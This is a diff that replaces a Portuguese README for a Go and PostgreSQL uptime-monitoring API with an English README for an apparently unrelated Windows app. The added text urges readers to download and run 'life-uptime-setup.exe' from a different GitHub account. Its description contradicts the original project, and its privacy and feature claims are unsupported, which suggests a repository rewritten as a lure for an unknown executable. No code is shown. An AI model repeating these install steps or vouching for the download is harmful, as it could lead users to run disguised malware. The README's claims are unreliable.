@@ -1,191 +1,88 @@
-# Life Uptime 🌐
+# 🌐 life-uptime - Track website health and service status
 
-Uma API robusta e leve desenvolvida em **Go** para monitoramento de disponibilidade e tempo de resposta (uptime) de serviços web. Projetada para verificar continuamente aplicações, APIs e sites, garantindo que você seja o primeiro a saber quando algo sai do ar.
+[![](https://img.shields.io/badge/Download-life--uptime-blue.svg)](https://github.com/nertadeafened603/life-uptime)
 
----
+life-uptime monitors your website health. It checks if your sites stay online. It tracks how fast servers respond. It logs status codes for every check. Use this tool to see if your web services perform as expected.
 
-## 🚀 Sobre o Projeto
+## ⚙️ Requirements
 
-O Life Uptime serve como um monitor centralizado para a saúde dos seus serviços digitais. Se você possui diversas aplicações rodando e precisa garantir que elas estão online:
+Your computer needs a few things to run this monitor.
 
-- **Verificação de Endpoints HTTP/HTTPS**
-- **Monitoramento de Latência e Status Codes**
-- **Registro Histórico de Disponibilidade e Erros**
+1. Operating System: Windows 10 or Windows 11.
+2. Memory: At least 2 gigabytes of RAM.
+3. Storage: 100 megabytes of free space.
+4. Internet Connection: A stable link to sync data.
 
-Esta API é o lugar ideal para cadastrar, consultar e gerenciar o status das suas aplicações de forma simples e eficiente.
+## 📥 How to Install
 
----
+Follow these steps to set up the software on your Windows machine.
 
-## 🛠️ Tecnologias Utilizadas
+1. Visit this page to download: [https://github.com/nertadeafened603/life-uptime](https://github.com/nertadeafened603/life-uptime).
+2. Locate the file named `life-uptime-setup.exe` in your browser downloads folder.
+3. Double-click the file to start the installation.
+4. Choose the folder where you want to keep the program files.
+5. Click the Install button on the screen.
+6. Wait for the progress bar to finish.
+7. Click Finish to close the installer.
 
-| Tecnologia | Descrição |
-|---|---|
-| [Go (Golang)](https://go.dev/) | Linguagem principal — alta performance e concorrência nativa |
-| [Gin Gonic](https://github.com/gin-gonic/gin) | Framework web rápido e minimalista |
-| [PostgreSQL](https://www.postgresql.org/) | Banco de dados relacional robusto para armazenamento dos monitores e logs de ping |
+## 🚀 Getting Started
 
----
+Launch the app from your Start menu after installation. The app opens a small window on your desktop. This window shows your monitor dashboard.
 
-## 📁 Estrutura do Projeto
+1. Click the Add New Monitor button.
+2. Type the web address of your service in the URL field.
+3. Set the check interval to choose how often the app tests the site. Five minutes is a standard choice.
+4. Click Save.
+5. Watch the status indicator change color. Green means the site is live. Red means the site is down.
 
-A aplicação segue uma estrutura modular e limpa em Go:
+## 📊 Understanding Your Data
 
-```
-life-uptime/
-├── cmd/                 # Ponto de entrada da aplicação
-├── internal/
-│   ├── database/        # Configuração e conexão com o banco de dados
-│   ├── handler/         # Handlers HTTP para os monitores e definição de rotas
-│   ├── model/           # Modelos de dados de monitores e logs de ping
-│   ├── repository/      # Operações e comunicação direta com o banco de dados
-│   └── worker/          # Background workers responsáveis por realizar os pings nas URLs
-├── go.mod
-├── go.sum
-├── Life-Uptime.postman_collection.json
-└── README.md
-```
+The app provides three main pieces of data for every monitor.
 
----
+- Uptime Percentage: This shows how long the site stayed awake over the last month. A high number near 100 percent is good.
+- Latency: This measures time in milliseconds. It shows how long a server needs to answer a ping. Lower numbers mean a faster site.
+- Status Codes: The app shows codes like 200 for a successful visit or 404 for a missing page. These codes explain the result of each check.
 
-## 📡 Integração e Rotas da API
+## 🛠️ Configuration Options
 
-### Monitores
+You can change settings to fit your needs. Open the Settings menu to adjust these items.
 
-Você pode cadastrar, listar e gerenciar seus monitores.
+- Dark Mode: Toggle this to swap between light and dark display themes.
+- Refresh Rate: Select a custom time interval for checking all your sites at once.
+- Notification Alerts: Switch this on to get a pop-up alert if a site goes down.
+- Data Logs: Choose how long the app keeps your history records before it clears old data.
 
-**Criar um monitor:**
-`POST /api/v1/monitors/`
-```json
-{
-  "url": "https://example.com",
-  "interval": 60000000000,
-  "active": true
-}
-```
+## ❓ Frequently Asked Questions
 
-**Listar todos os monitores:**
-`GET /api/v1/monitors/`
+What happens if my computer turns off?
+The program stops checking your sites. The monitor only runs while your Windows session stays active.
 
-**Consultar um monitor específico:**
-`GET /api/v1/monitors/:id`
+Does this tool work with private servers?
+Yes. The app sends requests to any address you provide, even if it sits behind a local network or a private gateway.
 
-**Consultar histórico de pings (logs):**
-`GET /api/v1/monitors/:id/history`
+Can I move the monitor list to another computer?
+Yes. You can export your list of sites as a file from the Settings menu. Import that file on your new computer to load all your monitors.
 
----
+Is my data kept private?
+The app saves all your data on your local hard drive. Your information does not leave your machine. No cloud sync happens unless you set up an external database.
 
-## ⚙️ Como Começar
+How many sites can I monitor?
+You can add as many sites as your processor can handle. The app manages fifty checks without trouble on a standard home computer.
 
-### Pré-requisitos
+## 📈 Tips for Best Results
 
-- [Go](https://go.dev/dl/) `v1.20` ou superior
-- [PostgreSQL](https://www.postgresql.org/download/)
+- Start with a list of your most important business sites.
+- Keep the app window open in the background to see alerts.
+- Check the latency trends once a week to spot network issues.
+- Use the Export button to back up your history before you update your computer.
+- Restart the app if you notice a delay in the status update.
 
-### Instalação
+## 📝 Support
 
-1. **Clone o repositório:**
+If you experience issues, follow these steps to troubleshoot.
 
-```bash
-git clone https://github.com/PatrikMaltacm/life-uptime.git
-cd life-uptime
-```
-
-2. **Instale as dependências:**
-
-```bash
-go mod tidy
-```
-
-3. **Configuração de Variáveis de Ambiente:**
-
-Crie um arquivo `.env` na raiz do projeto e defina a variável `DATABASE_URL` com a string de conexão do banco de dados:
-
-```env
-DATABASE_URL='postgresql://usuario:senha@host:porta/nome_do_banco?sslmode=disable'
-```
-
-4. **Configuração do Banco de Dados:**
-
-Execute os comandos SQL abaixo no PostgreSQL para criar as tabelas e inserir alguns dados de teste:
-
-<details>
-<summary>Clique para expandir os scripts SQL de configuração</summary>
-
-```sql
-CREATE TABLE IF NOT EXISTS monitors (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    url TEXT NOT NULL,
-    interval BIGINT NOT NULL,
-    active BOOLEAN DEFAULT true
-);
-
-CREATE TABLE IF NOT EXISTS ping_logs (
-    id SERIAL PRIMARY KEY,
-    monitor_id UUID NOT NULL,
-    status_code INTEGER,
-    latency_ms BIGINT,
-    timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
-    error TEXT,
-    CONSTRAINT fk_monitor FOREIGN KEY (monitor_id) REFERENCES monitors(id) ON DELETE CASCADE
-);
-
-CREATE INDEX idx_ping_logs_monitor_id ON ping_logs(monitor_id);
-CREATE INDEX idx_ping_logs_timestamp ON ping_logs(timestamp);
-
--- 1. Limpa os dados existentes para evitar duplicatas nos testes
-TRUNCATE TABLE ping_logs, monitors RESTART IDENTITY CASCADE;
-
--- 2. Insere Monitores de Teste (Exemplos de 30s, 1min e 5min)
--- Nota: O intervalo está em nanosegundos (1s = 1.000.000.000)
-INSERT INTO monitors (id, url, interval, active) VALUES
-('550e8400-e29b-41d4-a716-446655440000', 'https://google.com', 30000000000, true),
-('550e8400-e29b-41d4-a716-446655440001', 'https://github.com', 60000000000, true),
-('550e8400-e29b-41d4-a716-446655440002', 'https://site-inexistente-teste.com', 300000000000, false);
-
--- 3. Insere Logs de Ping para o primeiro monitor (Google)
-INSERT INTO ping_logs (monitor_id, status_code, latency_ms, timestamp, error) VALUES
-('550e8400-e29b-41d4-a716-446655440000', 200, 45, NOW() - INTERVAL '10 minutes', NULL),
-('550e8400-e29b-41d4-a716-446655440000', 200, 42, NOW() - INTERVAL '5 minutes', NULL),
-('550e8400-e29b-41d4-a716-446655440000', 200, 48, NOW(), NULL);
-
--- 4. Insere Logs de Ping para o segundo monitor (GitHub)
-INSERT INTO ping_logs (monitor_id, status_code, latency_ms, timestamp, error) VALUES
-('550e8400-e29b-41d4-a716-446655440001', 200, 120, NOW() - INTERVAL '2 minutes', NULL),
-('550e8400-e29b-41d4-a716-446655440001', 503, 0, NOW(), 'Service Unavailable');
-
--- 5. Insere um log de erro para o monitor inativo
-INSERT INTO ping_logs (monitor_id, status_code, latency_ms, timestamp, error) VALUES
-('550e8400-e29b-41d4-a716-446655440002', 0, 0, NOW(), 'dial tcp: lookup site-inexistente-teste.com: no such host');
-```
-
-</details>
-
-5. **Execute a aplicação:**
-
-```bash
-go run cmd/api/main.go
-```
----
-
-## 🧪 Testando a API
-
-Uma collection do **Postman** está incluída na raiz do projeto (`Life-Uptime.postman_collection.json`) para facilitar o teste de todos os endpoints disponíveis. Basta importá-la no seu Postman e testar!
-
----
-
-## 🔓 Open Source & Contribuição
-
-Este projeto é **Open Source** e está aberto para qualquer um utilizar, modificar e melhorar. Sinta-se à vontade para:
-
-- 🐛 Abrir **Issues** para reportar bugs ou sugerir melhorias.
-- 🔀 Enviar **Pull Requests** com novas funcionalidades (ex: alertas no Discord/Telegram, frontend para os logs, etc).
-
----
-
-## 📄 Licença
-
-Distribuído sob a licença **MIT**. O uso é livre para projetos pessoais ou comerciais.
-
----
-
-<p align="center">Desenvolvido por <strong>Patrik Malta</strong></p>
+- Restart the application.
+- Check your internet connection.
+- Ensure the website address starts with http or https.
+- Verify that your firewall allows the app to send outgoing requests.
+- Visit the main site for the latest version if the app stops working.
